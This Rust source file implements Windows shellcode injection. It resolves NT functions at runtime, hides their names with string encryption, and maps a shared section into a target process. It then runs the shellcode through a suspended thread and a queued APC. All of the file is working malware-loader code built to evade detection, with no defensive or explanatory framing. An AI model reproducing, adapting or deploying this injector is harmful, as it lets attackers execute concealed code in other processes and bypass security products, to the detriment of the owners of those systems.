#![allow(non_snake_case)]
#![allow(unused_assignments)]
#![allow(non_camel_case_types)]
#![allow(unused_variables)]

use std::{
    ffi::{CString, OsStr},
    mem,
    os::windows::ffi::OsStrExt,
    ptr::null_mut,
};

use ntapi::{
    ntldr::{LdrGetDllHandle, LdrGetProcedureAddress},
    ntmmapi::SECTION_INHERIT,
    ntpsapi::PPS_APC_ROUTINE,
    ntrtl::{RtlInitUnicodeString, RtlUnicodeStringToAnsiString},
};

use winapi::{
    ctypes::{c_char, c_void},
    shared::{
        basetsd::{PSIZE_T, ULONG_PTR, SIZE_T},
        minwindef::{BOOL, FARPROC, HMODULE, LPVOID, PULONG, ULONG},
        ntdef::{ANSI_STRING, BOOLEAN, HANDLE, NTSTATUS, PHANDLE, PLARGE_INTEGER, POBJECT_ATTRIBUTES, PVOID, STRING, UNICODE_STRING},
        ntstatus::STATUS_SUCCESS,
    },
    um::{
        minwinbase::LPTHREAD_START_ROUTINE,
        winnt::{ACCESS_MASK, LARGE_INTEGER, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, SECTION_MAP_EXECUTE, SECTION_MAP_READ, SECTION_MAP_WRITE, SEC_COMMIT},
    },
};

#[macro_use]
extern crate litcrypt;
use_litcrypt!();

// dynamically resolved functions
// dll handles and locate function

pub fn ldr_get_dll(dll_name: &str) -> HMODULE {
    let mut handle: *mut c_void = std::ptr::null_mut();
    let mut unicode_string = UNICODE_STRING {
        Length: 0,
        MaximumLength: 0,
        Buffer: std::ptr::null_mut(),
    };
    let dll_name_wide: Vec<u16> = OsStr::new(dll_name).encode_wide().chain(Some(0)).collect();
    unsafe {
        RtlInitUnicodeString(&mut unicode_string, dll_name_wide.as_ptr());
        let status = LdrGetDllHandle(
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            &mut unicode_string as *mut UNICODE_STRING,
            &mut handle,
        );
        if status != STATUS_SUCCESS || handle.is_null() {
            return std::ptr::null_mut();
        }
    }
    handle as HMODULE
}

pub fn ldr_get_fn(dll: HMODULE, fn_name: &str) -> FARPROC {
    let mut func: *mut c_void = std::ptr::null_mut();
    let mut ansi_string = STRING {
        Length: 0,
        MaximumLength: 0,
        Buffer: std::ptr::null_mut(),
    };
    let mut unicode_string = UNICODE_STRING {
        Length: 0,
        MaximumLength: 0,
        Buffer: std::ptr::null_mut(),
    };
    let fn_name_wide: Vec<u16> = OsStr::new(fn_name).encode_wide().chain(Some(0)).collect();
    unsafe {
        RtlInitUnicodeString(&mut unicode_string, fn_name_wide.as_ptr());
        RtlUnicodeStringToAnsiString(&mut ansi_string, &unicode_string, 1);
        let status = LdrGetProcedureAddress(
            dll as *mut c_void,
            &mut ansi_string as *mut STRING,
            0,
            &mut func,
        );
        if status != STATUS_SUCCESS || func.is_null() {
            return std::ptr::null_mut();
        }
    }
    func as FARPROC
}

pub fn get_wide(s: &str) -> Vec<u16> {
    OsStr::new(s)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect()
}

pub fn injection(mut new_handle: HANDLE, shellcode: &[u8]) {
    //get the function pointer for NtCreateSection
    let ntdll_handle = ldr_get_dll(&lc!("ntdll.dll"));
    let getnext_func = ldr_get_fn(ntdll_handle, &lc!("NtCreateSection"));

    //define NtCreateSection function
    let NtCreateSection: unsafe fn(
        PHANDLE,
        ACCESS_MASK,
        POBJECT_ATTRIBUTES,
        PLARGE_INTEGER,
        ULONG,
        ULONG,
        HANDLE,
    ) -> NTSTATUS = unsafe { std::mem::transmute(getnext_func as FARPROC) };

    let mut section_handle: HANDLE = std::ptr::null_mut();
    //create a pointer to the section handle
    let p_section_handle: PHANDLE = &mut section_handle;

    let flags = SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE;

    let shell_size = shellcode.len() as i64; // get the length of the SHELL array and convert to i64

    let mut section_size: LARGE_INTEGER = unsafe { std::mem::zeroed() };
    unsafe {
        *section_size.QuadPart_mut() = shell_size * mem::size_of::<u8>() as i64;

        //print section size
        //println!("Section Size: {}", *section_size.QuadPart());
        //print section handle
        //println!("Section Handle: {:?}", p_section_handle);

        //call NtCreateSection
        let result: NTSTATUS = NtCreateSection(
            p_section_handle,
            flags,
            0 as _,
            &mut section_size as PLARGE_INTEGER,
            PAGE_EXECUTE_READWRITE,
            SEC_COMMIT, // SEC_COMMIT
            0 as _,
        );

        //check if section_handle is null
        if section_handle == null_mut() {
            //println!("secion handle is null");
            //println!("Error Code: {}", result);
            return;
        }

        //check if result is 0
        if result != 0 {
            //println!("Failed to create section");
            //println!("Error Code: {}", result);
            return;
        }

        //check the result of the API call and handle any errors.

        if result == 0 {
            //println!("NtCreateSection successful");
            //println!("Section Handle: {:x?}", section_handle);
        } else {
            //println!("NtCreateSection Failed!");
            //println!("Error Code: {}", result);
        }

        //now that we have a section handle, let's map it into the target process using NtMapViewOfSection

        //get the function pointer for NtMapViewOfSection
        let getnext_func = ldr_get_fn(ntdll_handle, &lc!("NtMapViewOfSection"));

        //define NtMapViewOfSection function
        let NtMapViewOfSection: unsafe fn(
            SectionHandle: HANDLE,
            ProcessHandle: HANDLE,
            BaseAddress: *mut PVOID,
            ZeroBits: ULONG_PTR,
            CommitSize: SIZE_T,
            SectionOffset: PLARGE_INTEGER,
            ViewSize: PSIZE_T,
            InheritDisposition: SECTION_INHERIT,
            AllocationType: ULONG,
            Win32Protect: ULONG,
        ) -> NTSTATUS = std::mem::transmute(getnext_func as FARPROC);

        //let mut section_size: LARGE_INTEGER = unsafe { std::mem::zeroed() };
        let mut large_integer: LARGE_INTEGER = std::mem::zeroed();
        //*section_size.QuadPart_mut() = shell_size * mem::size_of::<u8>() as i64;
        *large_integer.QuadPart_mut() = 0;
        let section_offset: PLARGE_INTEGER = &mut large_integer;

        let mut scbase: PVOID = std::ptr::null_mut();
        //get a pointer to the scbase
        let p_scbase: *mut PVOID = &mut scbase;

        //locate GetCurrentProcess function in kernel32.dll
        let kernel32_handle = ldr_get_dll(&lc!("kernel32.dll"));
        let getcurrentprocess_func =
            ldr_get_fn(kernel32_handle, &lc!("GetCurrentProcess"));

        //define GetCurrentProcess function
        let GetCurrentProcess: unsafe fn() -> HANDLE =
            std::mem::transmute(getcurrentprocess_func as FARPROC);

        //get current process handle by calling GetCurrentProcess
        let mut current_process_handle = GetCurrentProcess();
        //make a pointer to the current process handle
        let p_current_process_handle: PHANDLE = &mut current_process_handle;
        //println!("GetLastError: {}", unsafe { GetLastError() });
        //println!("Current Process Handle: {:?}", p_current_process_handle);

        //setup the maxsize equal to the size of the shell_size
        let mut maxsize: SIZE_T = shell_size as SIZE_T;

        let pmaxsize: PSIZE_T = &mut maxsize;

        //println!("maxsize: {:?}", maxsize);
        //println!("pmaxsize: {:?}", pmaxsize);

        //println!("section offset: {:x?}", section_offset);
        //println!("section handle: {:x?}", p_section_handle);

        //print scbase
        //println!("scbase: {:x?}", scbase);
        //print p_scb   ase
        //println!("p_scbase: {:x?}", p_scbase);
        //fNtMapViewOfSection(sectionHandle, GetCurrentProcess(), &localSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_READWRITE);
        let callresult = NtMapViewOfSection(
            *p_section_handle,
            *p_current_process_handle,
            p_scbase,
            0 as _,
            0 as _,
            section_offset,
            pmaxsize,
            2,
            0 as _,
            PAGE_READWRITE,
        );

        //check if scbase is null
        if scbase == null_mut() {
            //println!("scbase is null");
            //println!("Error Code: {}", callresult);
            return;
        }

        //check if callresult is 0

        if callresult == 0 {
            //println!("NtMapViewOfSection successful");
            //println!("scbase: {:x?}", scbase);
        } else {
            //println!("NtMapViewOfSection Failed!");
            //println!("Error Code: {}", callresult);
            return;
        }

        //setup a var to hold the base address of the section in the target process
        let mut scbase2: PVOID = std::ptr::null_mut();
        //make a pointer to scbase2
        let p_scbase2: *mut PVOID = &mut scbase2;

        //get pointer to new_handle
        let p_new_handle: *mut HANDLE = &mut new_handle;
        //print new handle
        //println!("New Handle: {:?}", new_handle);
        //print p_new_handle
        //println!("p_new_handle: {:?}", p_new_handle);

        //now let's map the section into the target process using NtMapViewOfSection
        let resultmapremote = NtMapViewOfSection(
            *p_section_handle,
            *p_new_handle,
            p_scbase2,
            0 as _,
            0 as _,
            section_offset,
            pmaxsize,
            2,
            0 as _,
            PAGE_EXECUTE_READ,
        );

        //check if scbase2 is null

        if scbase2 == null_mut() {
            //println!("scbase2 is null");
            //println!("Error Code: {}", resultmapremote);
            return;
        } else {
            //println!("Remote NtMapViewOfSection successful");
            //println!("scbase2: {:x?}", scbase2);
        }

        //now write the shellcode to the shared section
        //try using std::ptr::copy_nonoverlapping

        //get pointer to SHELL_CODE
        let p_shell_code: *const u8 = shellcode.as_ptr();

        let resultcopy =
            std::ptr::copy_nonoverlapping(p_shell_code, scbase as *mut u8, shellcode.len());

        //getlocalexportoffset from remote process using LdrGetDllHandle and LdrGetProcedureAddress
        //we want the remote thread start address offset from the base address of ntdll RtlExitUserThread

        // since we already have the ntdll handle, we can use it to get the address of RtlExitUserThread
        let getnext_func = ldr_get_fn(ntdll_handle, &lc!("RtlExitUserThread"));

        //define RtlExitUserThread function
        let RtlExitUserThread: unsafe fn() -> NTSTATUS =
            std::mem::transmute(getnext_func as FARPROC);

        //now we want to Create a suspended thread at Rtlexituserthread in remote process

        let hRemoteThread: HANDLE = std::ptr::null_mut();

        //function to get module base address for ntdll and fn RtlExitUserThread

        //locate the RtlInitUnicodeString function in ntdll.dll
        let getnext_func = ldr_get_fn(ntdll_handle, &lc!("RtlInitUnicodeString"));

        //define export_name so that it equals RtlExitUserThread
        let export_name = "RtlExitUserThread";

        let u_func_name = CString::new(export_name).unwrap();
        let mut u_func_string: UNICODE_STRING = std::mem::zeroed();
        RtlInitUnicodeString(&mut u_func_string, u_func_name.as_ptr() as *const u16);

        //locate teh RtlUnicodeStringToAnsiString function in ntdll.dll
        let getnext_func = ldr_get_fn(
            ntdll_handle,
            &lc!("RtlUnicodeStringToAnsiString"),
        );

        //define RtlUnicodeStringToAnsiString function
        let RtlUnicodeStringToAnsiString: unsafe fn(
            DestinationString: *mut ANSI_STRING,
            SourceString: *mut UNICODE_STRING,
            AllocateDestinationString: i32,
        ) -> NTSTATUS = std::mem::transmute(getnext_func as FARPROC);

        //set a_func_name so it is equal to u_func_string
        let mut a_func_name: ANSI_STRING = std::mem::zeroed();

        //convert the unicode string to ansi

        let r: NTSTATUS = RtlUnicodeStringToAnsiString(
            &mut a_func_name,
            &mut u_func_string as *mut UNICODE_STRING,
            true as i32,
        );
        if r != 0 {
            //println!("[!] Failed to convert function name to ANSI..");
        }

        //print ntdll base address
        //println!("ntdll base address: {:x?}", ntdll_handle);

        let mut p_export: PVOID = std::ptr::null_mut();
        let func_name: *const c_char = a_func_name.Buffer as *const c_char;
        let call_result = ldr_get_fn(ntdll_handle, &lc!("RtlExitUserThread"));
        if call_result.is_null() {
            //println!("[!] Failed to get {} address..", export_name);
        } else {
            p_export = call_result as PVOID;

            //println!("    |-> {}: 0x{:X}", export_name, p_export as usize);
        }

        let func_offset = (p_export as isize) - (ntdll_handle as isize);
        //println!("    |-> Offset: 0x{:X}", func_offset);

        //calculate the address of the remote thread start address by adding the offset to the base address of ntdll
        let remote_thread_start_address = (ntdll_handle as usize + func_offset as usize) as LPVOID;

        //now we can create the remote thread

        //locate the NtCreateThreadEx function in ntdll.dll
        let getnext_func = ldr_get_fn(ntdll_handle, &lc!("NtCreateThreadEx"));

        //define NtCreateThreadEx function

        let NtCreateThreadEx: unsafe fn(
            ThreadHandle: PHANDLE,
            DesiredAccess: ACCESS_MASK,
            ObjectAttributes: POBJECT_ATTRIBUTES,
            ProcessHandle: HANDLE,
            lpStartAddress: LPTHREAD_START_ROUTINE,
            lpParameter: LPVOID,
            CreateSuspended: BOOL,
            StackZeroBits: ULONG,
            SizeOfStackCommit: SIZE_T,
            SizeOfStackReserve: SIZE_T,
            lpBytesBuffer: LPVOID,
        ) -> NTSTATUS = std::mem::transmute(getnext_func as FARPROC);

        //define empty hRemoteThread handle
        let mut hRemoteThread: HANDLE = std::ptr::null_mut();

        //convert the address of RtlExitUserThread_address to a LPTHREAD_START_ROUTINE
        let remote_address: LPTHREAD_START_ROUTINE =
            std::mem::transmute(remote_thread_start_address);

        let resultcreatethread = NtCreateThreadEx(
            &mut hRemoteThread,
            0x1FFFFF,
            std::ptr::null_mut(),
            new_handle,
            remote_address,
            std::ptr::null_mut(),
            1,
            0,
            0xfffff,
            0xfffff,
            std::ptr::null_mut(),
        );

        //trigger the thread with NtQueueApcThread

        //locate the NtQueueApcThread function in ntdll.dll
        let getnext_func = ldr_get_fn(ntdll_handle, &lc!("NtQueueApcThread"));

        //define NtQueueApcThread function

        let NtQueueApcThread: unsafe fn(
            ThreadHandle: HANDLE,
            ApcRoutine: PPS_APC_ROUTINE,
            ApcRoutineContext: PVOID,
            ApcStatusBlock: PVOID,
            ApcReserved: PVOID,
        ) -> NTSTATUS = std::mem::transmute(getnext_func as FARPROC);

        //convert scbase2 to a PPS_APC_ROUTINE
        let scbase2: PPS_APC_ROUTINE = std::mem::transmute(scbase2 as usize);

        let triggerresult = NtQueueApcThread(
            hRemoteThread,
            scbase2,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
        );

        //check triggerresult
        //println!("triggerresult: {}", triggerresult);

        //now we can resume the thread with NtAlertResumeThread

        //locate the NtAlertResumeThread function in ntdll.dll
        let getnext_func = ldr_get_fn(ntdll_handle, &lc!("NtAlertResumeThread"));

        //define NtAlertResumeThread function

        let NtAlertResumeThread: unsafe fn(
            ThreadHandle: HANDLE,
            PreviousSuspendCount: PULONG,
        ) -> NTSTATUS = std::mem::transmute(getnext_func as FARPROC);

        let mut previous_suspend_count: ULONG = 0;

        let resumeresult = NtAlertResumeThread(hRemoteThread, &mut previous_suspend_count);

        //now we can wait for the thread to finish with NtWaitForSingleObject

        //locate the NtWaitForSingleObject function in ntdll.dll
        let getnext_func = ldr_get_fn(ntdll_handle, &lc!("NtWaitForSingleObject"));

        //define NtWaitForSingleObject function

        let NtWaitForSingleObject: unsafe fn(
            Handle: HANDLE,
            Alertable: BOOLEAN,
            Timeout: PLARGE_INTEGER,
        ) -> NTSTATUS = std::mem::transmute(getnext_func as FARPROC);

        //define timeout2 in the same fashion, but make it equal to 1 second

        let timeout = std::mem::transmute::<&mut i64, &mut LARGE_INTEGER>(&mut 10000000);

        let waitresult = NtWaitForSingleObject(hRemoteThread, 1, timeout);

    }; //end unsafe
}